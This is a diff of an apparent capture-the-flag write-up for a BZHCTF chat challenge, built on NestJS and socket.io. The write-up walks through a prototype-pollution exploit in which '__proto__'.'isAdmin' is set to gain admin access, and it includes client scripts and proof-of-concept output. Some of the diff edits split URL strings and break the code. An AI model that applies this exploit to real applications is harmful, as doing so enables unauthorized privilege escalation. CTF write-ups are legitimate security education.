@@ -28,11 +28,6 @@
 21
 22
 23
-```
-
-
-
-```
 export class ChatGateway implements OnGatewayConnection, OnGatewayDisconnect {
  // ...
 
@@ -56,11 +51,6 @@ export class ChatGateway implements OnGatewayConnection, OnGatewayDisconnect {
  message: messageInstance.content,
  });
  }
-```
-
-
-
-```
 1
  2
  3
@@ -79,14 +69,10 @@ export class ChatGateway implements OnGatewayConnection, OnGatewayDisconnect {
 16
 17
 18
-```
-
-
-
-```
 import { io } from "socket.io-client";
 
-const url = "ws://localhost:8888";
+const url = "ws://localhost:
+8888";
 
 const human = io(url);
 
@@ -102,27 +88,12 @@ human.emit("sendMessage", {
  "authorName": "toto",
  "message": "Hello world !"
 });
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 $ node client.mjs
 RECV (onMessage):
 [ { authorName: 'toto', message: 'Hello world !' } ]
-```
-
-
-
-```
 1
  2
  3
@@ -148,11 +119,6 @@ RECV (onMessage):
 23
 24
 25
-```
-
-
-
-```
 export class ChatGateway implements OnGatewayConnection, OnGatewayDisconnect {
  // ...
 
@@ -178,11 +144,6 @@ export class ChatGateway implements OnGatewayConnection, OnGatewayDisconnect {
  socket.emit('onmessage', 'Welcome home admin, BZHCTF{}');
  }
  }
-```
-
-
-
-```
 1
  2
  3
@@ -206,11 +167,6 @@ export class ChatGateway implements OnGatewayConnection, OnGatewayDisconnect {
 21
 22
 23
-```
-
-
-
-```
 export class ModerationService {
  // ...
 
@@ -234,33 +190,18 @@ export class ModerationService {
 
  return list;
  }
-```
-
-
-
-```
 1
 2
 3
 4
 5
 6
-```
-
-
-
-```
 let username = "__proto__";
 let message = "isAdmin";
 let reason = "true"; // any string with length >= 1 to pass the condition
 
 list[username][message] = reason
 // list["__proto__"]["isAdmin"] = "true"
-```
-
-
-
-```
 1
  2
  3
@@ -276,11 +217,6 @@ list[username][message] = reason
 13
 14
 15
-```
-
-
-
-```
 export class ChatGateway implements OnGatewayConnection, OnGatewayDisconnect {
  // ...
 
@@ -296,11 +232,6 @@ export class ChatGateway implements OnGatewayConnection, OnGatewayDisconnect {
 
  socket.emit('setBanList', this.moderationService.getCanceledPeople());
  }
-```
-
-
-
-```
 1
 2
 3
@@ -308,11 +239,6 @@ export class ChatGateway implements OnGatewayConnection, OnGatewayDisconnect {
 5
 6
 7
-```
-
-
-
-```
 export class ModerationService {
  // ...
 
@@ -320,27 +246,12 @@ export class ModerationService {
  client[reason] = 'suspicious';
  this.reportedUsers.add(client.username);
  }
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 client["isAdmin"] = 'suspicious';
 
 if (client.isAdmin) // will be true
-```
-
-
-
-```
 1
  2
  3
@@ -385,11 +296,6 @@ if (client.isAdmin) // will be true
 42
 43
 44
-```
-
-
-
-```
 export class ChatGateway implements OnGatewayConnection, OnGatewayDisconnect {
  // ...
 
@@ -434,11 +340,6 @@ export class ChatGateway implements OnGatewayConnection, OnGatewayDisconnect {
  }
  this.moderationService.sus(suspected, reason);
  }
-```
-
-
-
-```
 1
  2
  3
@@ -483,14 +384,10 @@ export class ChatGateway implements OnGatewayConnection, OnGatewayDisconnect {
 42
 43
 44
-```
-
-
-
-```
 import { io } from "socket.io-client";
 
-// const url = "ws://localhost:8888";
+// const url = "ws://localhost:
+8888";
 const url = "https://arianechat-3bb948c9ac36cf54.ctf.bzh/";
 
 const human = io(url);
@@ -531,27 +428,12 @@ setTimeout(() => {
  human.emit("getBanList");
  }, 500);
 }, 500)
-```
-
-
-
-```
 1
 2
 3
-```
-
-
-
-```
 $ node test.mjs
 HUMAN RECV (setBanList):
 [ {} ]
-```
-
-
-
-```
 1
  2
  3
@@ -629,14 +511,10 @@ HUMAN RECV (setBanList):
 75
 76
 77
-```
-
-
-
-```
 import { io } from "socket.io-client";
 
-const url = "ws://localhost:8888";
+const url = "ws://localhost:
+8888";
 
 const human = io(url);
 const banUser = io(url);
@@ -711,11 +589,6 @@ setTimeout(() => {
  }, sleep);
  }, sleep);
 }, sleep);
-```
-
-
-
-```
 1
  2
  3
@@ -729,11 +602,6 @@ setTimeout(() => {
 11
 12
 13
-```
-
-
-
-```
 $ node poc.mjs
 human RECV (onMessage):
 [ { authorName: '__proto__', message: 'isAdmin' } ]
